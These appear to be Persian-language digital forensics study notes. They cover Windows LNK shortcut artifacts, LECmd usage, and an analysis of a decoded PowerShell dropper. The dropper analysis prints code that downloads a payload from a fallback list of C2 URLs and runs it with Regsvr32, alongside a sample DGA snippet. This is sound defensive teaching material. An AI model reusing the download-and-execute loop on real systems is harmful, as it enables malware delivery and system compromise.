
![[Pasted image 20260610130609.png]]



## فایل‌های LNK چیستند؟

فایل‌های **LNK** (Shell Link / Shortcut) توسط ویندوز **به‌صورت خودکار** ساخته می‌شن — هر بار که کاربر یک فایل یا پوشه رو باز کنه.

---

## اهمیت فارنزیکی

> **باقی می‌مانند حتی بعد از حذف فایل اصلی**

یعنی اگر مهاجم فایل مخرب رو حذف کرد، LNK هنوز اطلاعاتش رو نگه داشته.

---

## اطلاعاتی که LNK ذخیره می‌کنه

| فیلد | مثال |
|------|------|
| مسیر کامل فایل target | `C:\Users\attacker\payload.exe` |
| Volume Serial Number | شناسه دیسک |
| MAC Address سیستم | اگر از شبکه باز شده باشه |
| زمان‌های MACB فایل target | در لحظه باز کردن |
| Drive Type | Local / Network / Removable |
| Machine Name (NetBIOS) | نام سیستم مبدا |

---

## مسیر آرتیفکت

C:\Users\<PROFILE>\AppData\Roaming\Microsoft\Windows\Recent

![[Pasted image 20260610131201.png]]


---

## ابزار LECmd

بله — **LECmd** (LNK Explorer Command line) از ابزارهای **Eric Zimmerman** است.

```cmd
# تحلیل یک فایل LNK
LECmd.exe -f "C:\...\Recent\malware.lnk"

# تحلیل کل پوشه Recent + خروجی CSV
LECmd.exe -d "C:\Users\user\AppData\Roaming\Microsoft\Windows\Recent" --csv output\
```

---

## سناریو حمله ISO (از جلسه قبل)

وقتی ISO mount می‌شه، LNK داخل ISO اجرای `rundll32.exe` رو trigger می‌کنه. LECmd می‌تونه:
- مسیر DLL مخرب رو استخراج کنه
- نشون بده که از کدام Drive Letter مانت شده
- MAC Address سیستم مهاجم رو (اگر از شبکه بود) نشون بده

## تحلیل این PowerShell Dropper

### کد decode شده (خلاصه)

```powershell
# 1. مخفی کردن Progress bar
$ProgressPreference="SilentlyContinue"

# 2. لیست C2 سرورها
$links=("https://descontador.com.br/...", "https://www.elaboro.pl/...", ...)

# 3. ساخت مسیر مخفی در TMP
$d = "$env:TMP\..\nfWFQ"   # یعنی: C:\Users\user\nfWFQ  (خارج از TMP با ..\)
mkdir -force $d

# 4. دانلود و اجرا
foreach ($u in $links) {
    IWR $u -OutFile $d\jxKPIrMFxJ.0Of   # دانلود با پسوند جعلی
    Regsvr32.exe "$d\jxKPIrMFxJ.00f"    # اجرای DLL
    break  # اولین موفق = توقف
}
```

---

## تکنیک‌های مخرب به‌کار رفته

| تکنیک | توضیح |
|--------|--------|
| **Path Traversal در TMP** | `$env:TMP\..\nfWFQ` → خروج از پوشه TMP |
| **پسوند جعلی** | دانلود با `.0Of` ولی اجرا با `.00f` (دور زدن AV) |
| **Regsvr32 LOLBin** | اجرای DLL بدون نیاز به admin — تکنیک Squiblydoo |
| **Fallback C2 List** | اگر یک سرور down باشد، سراغ بعدی می‌رود |
| **`SilentlyContinue`** | مخفی کردن خطاها از دید کاربر |

---

## ارتباط با DGA (Domain Generation Algorithm)

این کد **DGA واقعی نیست**، اما از **مفهوم مشابه** استفاده می‌کنه:

### DGA چیست؟
بدافزار به‌جای hardcode کردن آدرس C2،
هر روز/ساعت یک الگوریتم اجرا می‌کند:
seed (تاریخ) → تولید صدها دامنه تصادفی
→ اتصال به اولین دامنه‌ای که پاسخ دهد


### شباهت این کد به DGA

DGA واقعی:این کد:
────────────────────────────────
دامنه‌ها تولید      دامنه‌ها hardcode
می‌شوند             شده‌اند↕ تفاوت
هر دو: Resilience در برابر Takedown
هر دو: اتصال به اولین موفق → break
هر دو: چندین C2 به‌عنوان fallback


### تفاوت کلیدی
- **DGA:** دامنه‌ها **runtime** ساخته می‌شن → takedown تقریباً غیرممکن
- **این کد:** دامنه‌ها **static** هستن → با بلاک کردن همه ۶ URL، متوقف می‌شه

### نمونه کد DGA واقعی (برای مقایسه — Python)
```python
import datetime, hashlib
date = datetime.date.today().strftime("%Y%m%d")
for i in range(100):
    domain = hashlib.md5(f"{date}{i}".encode()).hexdigest()[:12] + ".com"
    # → هر روز 100 دامنه متفاوت
```

---

## خلاصه

این کد یک **Dropper با Fallback C2 List** است که از تکنیک‌های LOLBin (Regsvr32) و path obfuscation استفاده می‌کند. ارتباطش با DGA در **منطق Resilience** است، نه الگوریتم تولید دامنه.